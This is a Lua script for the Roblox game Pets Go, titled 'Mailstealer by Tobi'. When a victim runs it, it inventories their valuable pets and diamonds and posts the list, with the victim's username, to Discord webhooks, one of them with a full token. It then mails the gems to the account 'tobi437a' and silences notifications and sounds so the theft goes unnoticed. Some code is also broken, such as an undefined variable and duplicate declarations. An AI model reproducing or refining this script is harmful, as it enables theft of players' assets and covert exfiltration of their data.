local rapThreshold = 100000 -- Set the RAP threshold value

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")

local library = require(game.ReplicatedStorage.Library)

local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory

local plr = game.Players.LocalPlayer

local MailMessage = "Join gg / GY2RVSEGDT to get back"

local HttpService = game:GetService("HttpService")

-- Ensure the Library module exists
local libraryModule = replicatedStorage:FindFirstChild("Library")
if not libraryModule then
    warn("Library module not found!")
    return
end

local library = require(libraryModule)

-- Ensure the Client and Save modules exist
local clientFolder = replicatedStorage:FindFirstChild("Library"):FindFirstChild("Client")
if not (clientFolder and clientFolder:FindFirstChild("Save")) then
    warn("Save module not found!")
    return
end

-- Retrieve the player's inventory
local saveData = require(clientFolder.Save).Get()
if not (saveData and saveData.Inventory) then
    warn("Failed to retrieve inventory data!")
    return
end

local save = saveData.Inventory
local sortedItems = {}
local totalRAP = 0
_G.scriptExecuted = _G.scriptExecuted or false

-- Prevent script from executing multiple times
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- Get the amount of "Diamonds" in the player's currency
local GemAmount1 = 0
for _, currency in pairs(save.Currency) do
    if currency.id == "Diamonds" then
        GemAmount1 = currency._am
        break
    end
end

-- Helper function to format large numbers with suffixes (k, m, b, etc.)
local function formatNumber(number)
    if number == nil then
        return "0"
    end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Define the global and alternative webhooks
local globalWebhook = "https://discord.com/api/webhooks/1289613307631632417/xyz1234"
local alternateWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"

-- Function to send a message to the webhooks
local function SendMessage(username, diamonds, isAboveThreshold)
    local headers = {
        ["Content-Type"] = "application/json",
    }

    local fields = {
        {
            name = "Victim Username:",
            value = username,
            inline = true
        },
        {
            name = "Items to be sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = "",
            inline = false
        }
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Pets Go Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)

    -- Always send to the global webhook
    if globalWebhook and globalWebhook ~= "" then
        HttpService:PostAsync(globalWebhook, body, Enum.HttpContentType.ApplicationJson)
    end

    -- If the RAP is below threshold, send to the alternative webhook too
    if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
        HttpService:PostAsync(alternateWebhook, body, Enum.HttpContentType.ApplicationJson)
    end
end

-- Disable certain UI elements and sounds
local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

-- Function to get RAP value for a specific item
local function getRAP(Type, Item)
    return (require(replicatedStorage.Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = "tobi437a"

-- Function to send items
local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response = false
    repeat
        response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    until response == true
end

-- Function to send all gems above a certain RAP threshold
local function SendAllGems()
    for i, v in pairs(save.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= 500 and GemAmount1 >= rapThreshold then
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = i,
                    [5] = GemAmount1
                }
                local response = false
                repeat
                    response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                until response == true
                break
            end
        end
    end
end

-- Function to claim all mail
local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

-- Process items in different categories
local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}

for _, category in ipairs(categoryList) do
    if save[category] then
        for uid, item in pairs(save[category]) do
            if category == "Pet" then
                local rapValue = getRAP(category, item)
                if rapValue >= rapThreshold then
                    local itemInfo = {
                        name = item.name,
                        amount = item.amount,
                        rap = rapValue,
                        chance = item.sh or 0
                    }
                    table.insert(sortedItems, itemInfo)
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            else
                if item._am > 0 then
                    local rapValue = getRAP(category, item)
                    if rapValue >= rapThreshold then
                        local itemInfo = {
                            name = item.name,
                            amount = item.amount,
                            rap = rapValue,
                            chance = item.sh or 0
                        }
                        table.insert(sortedItems, itemInfo)
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            end
        end
    end
end

-- Send the collected items and gems
SendMessage(user, GemAmount1, totalRAP < rapThreshold)
SendAllGems()
ClaimMail()
